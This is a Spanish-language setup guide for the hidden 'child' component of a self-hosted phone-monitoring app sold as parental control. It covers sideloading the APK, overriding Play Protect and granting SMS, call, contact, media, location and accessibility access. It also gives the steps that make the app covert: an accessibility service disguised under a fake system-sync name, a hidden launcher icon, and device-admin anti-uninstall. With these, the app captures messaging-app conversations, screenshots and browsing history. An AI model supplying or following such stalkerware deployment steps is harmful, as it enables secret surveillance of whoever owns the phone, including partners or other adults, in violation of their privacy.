# Guía de instalación de la app hijo

> **Necesitas acceso físico al teléfono del hijo UNA SOLA VEZ.**
> Todo el proceso dura unos 5 minutos.

---

## Requisitos

- Android 8.0 o superior (recomendado Android 11+ para capturas de pantalla)
- El servidor ya instalado y accesible por HTTPS
- El APK compilado de la app hijo (`child-app.apk`)

---

## Paso 1 — Compilar el APK

En tu máquina de desarrollo:

```bash
cd child-app

# Edita el archivo de configuración con la URL de tu servidor
# Archivo: app/src/main/kotlin/com/monitor/child/data/PreferencesManager.kt
# Cambia SERVER_URL por defecto si lo tienes hardcodeado,
# o se configura durante el emparejamiento (Setup).

# Compilar APK de release
./gradlew assembleRelease

# El APK estará en:
# app/build/outputs/apk/release/app-release.apk
```

Copia el APK al teléfono del hijo (por USB, Google Drive, correo, etc.).

---

## Paso 2 — Activar fuentes desconocidas

En el teléfono del hijo:

1. Ve a **Ajustes** → **Seguridad** (o **Aplicaciones**)
2. Activa **"Instalar aplicaciones de fuentes desconocidas"**
   - En Android 8+: ve a **Ajustes → Apps → Instalar apps desconocidas** → selecciona el navegador/gestor de archivos que usarás para instalar

---

## Paso 3 — Instalar el APK

1. Abre el gestor de archivos del teléfono
2. Navega hasta donde copiaste el APK
3. Pulsa sobre él e instala
4. Si aparece "Play Protect" avisa de app desconocida → pulsa **"Instalar de todas formas"**

---

## Paso 4 — Configuración inicial (Setup)

Al abrirse la app por primera vez aparece la pantalla de configuración:

### 4a. Introducir la URL del servidor

Escribe la URL completa de tu servidor:
```
https://control.tudominio.com
```

### 4b. Código de emparejamiento

Antes de este paso, genera un código desde la **app del padre**:
1. Abre la app padre → **"Añadir dispositivo"**
2. Introduce el nombre del dispositivo (p.ej. "Samsung de Juan")
3. Se genera un **código de 8 caracteres** válido durante 24 horas

Introduce ese código en la app hijo y pulsa **"Emparejar"**.

Si el emparejamiento es correcto verás: ✅ *"Dispositivo registrado correctamente"*

---

## Paso 5 — Conceder permisos

La app solicitará varios permisos críticos. **Concede TODOS**:

### Permisos automáticos (la app los pide directamente):
- ✅ **Ubicación precisa** (siempre, incluido en background)
- ✅ **Almacenamiento / Acceso a medios** (fotos y vídeos)
- ✅ **Teléfono** (registro de llamadas)
- ✅ **Contactos** (sincronizar lista)
- ✅ **SMS** (leer mensajes)

### Permisos especiales (la app abre los ajustes):

**Administrador del dispositivo** (anti-desinstalación):
1. La app te lleva a **Ajustes → Seguridad → Admins de dispositivo**
2. Activa **"Control Parental"** → pulsa **"Activar"**

**Accesibilidad** (captura de mensajes, bloqueo de apps):
1. La app te lleva a **Ajustes → Accesibilidad**
2. Busca **"Sincronización del sistema"** (nombre camuflado)
3. Actívalo → pulsa **"Permitir"**

**Estadísticas de uso de apps**:
1. La app te lleva a **Ajustes → Apps → Acceso a uso**
2. Busca la app → activa el acceso

**Optimización de batería** (para que no se duerma):
1. La app te lleva a **Ajustes → Batería**
2. Busca la app → selecciona **"Sin restricciones"** o **"No optimizar"**

---

## Paso 6 — Ocultar el icono

Una vez configurada, la app se oculta automáticamente del launcher.

Si por algún motivo el icono sigue visible:
- El icono aparece como una app genérica sin nombre
- Puedes desactivar el componente del launcher manualmente desde la SetupActivity

---

## Paso 7 — Verificar que funciona

Desde la app del padre:
1. El dispositivo debería aparecer como **"Conectado"** (punto verde)
2. La batería debería mostrarse
3. La ubicación debería actualizarse en los próximos 10 minutos

---

## Permisos por módulo

| Funcionalidad | Permiso necesario |
|---------------|-------------------|
| Localización pasiva/ahora/live | Ubicación precisa + background |
| Mensajes (WhatsApp, Telegram, Teams…) | Accesibilidad |
| Galería (fotos/vídeos) | Almacenamiento / Medios |
| SMS | SMS |
| Llamadas | Teléfono |
| Contactos | Contactos |
| Historial web (VPN local) | Permiso VPN (diálogo del sistema) |
| Bloqueo de apps | Accesibilidad |
| Límites de tiempo | Accesibilidad + Estadísticas de uso |
| Horarios de bloqueo | Accesibilidad + Administrador de dispositivo |
| Bloqueo remoto | Administrador de dispositivo |
| Capturas de pantalla | Accesibilidad (Android 11+) |
| Anti-desinstalación | Administrador de dispositivo |

---

## Solución de problemas

### "El dispositivo no aparece conectado"
- Verifica que la URL del servidor es correcta (HTTPS, sin barra final)
- Comprueba que el teléfono tiene conexión a internet
- Revisa los logs del servidor: `docker compose logs control-api`

### "No llegan mensajes de WhatsApp"
- Verifica que el permiso de Accesibilidad está activo
- Abre WhatsApp en el teléfono hijo y vuelve a comprobarlo desde el padre en 1 minuto

### "La app desaparece al reiniciar"
- El permiso de Administrador de dispositivo puede no estar activo
- Verificar en Ajustes → Seguridad → Admins de dispositivo

### "Las capturas de pantalla no llegan"
- Solo funciona en Android 11 o superior
- El Accessibility Service debe estar activo

### Desinstalar (si necesitas hacerlo)
1. Ve a **Ajustes → Seguridad → Admins de dispositivo**
2. Desactiva "Control Parental"
3. Ahora puedes desinstalar la app normalmente desde Ajustes → Apps
